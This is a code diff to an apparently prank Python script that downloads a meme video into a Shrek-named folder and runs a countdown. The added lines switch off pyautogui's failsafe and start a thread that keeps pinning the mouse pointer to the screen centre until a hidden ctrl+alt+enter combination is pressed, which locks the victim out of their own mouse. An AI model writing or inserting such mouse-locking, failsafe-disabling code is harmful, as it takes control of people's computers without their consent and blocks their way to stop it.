@@ -16,6 +16,23 @@ from urllib.request import urlopen
 import pyautogui
 from pathlib import Path
 
+pyautogui.FAILSAFE = False
+
+# Find monitor width/height
+
+width, height= pyautogui.size()
+
+# Lock mouse
+
+def mouse():
+ while True:
+    if keyboard.is_pressed('ctrl+alt+enter'):
+        break
+    else:
+        pyautogui.moveTo(width/2, height/2)
+
+threading.Thread(target=mouse).start()
+
 # Create Reference to desktop
 
 desktop = "%UserProfile%\\Desktop"
@@ -63,10 +80,6 @@ else:
     with open("C:/Shrek_Files/meme.mp4", 'wb') as local:
         with urlopen(url2) as remote:
             local.write(remote.read())
-
-# Find monitor width/height
-
-width, height= pyautogui.size()
 
 # Countdown
 
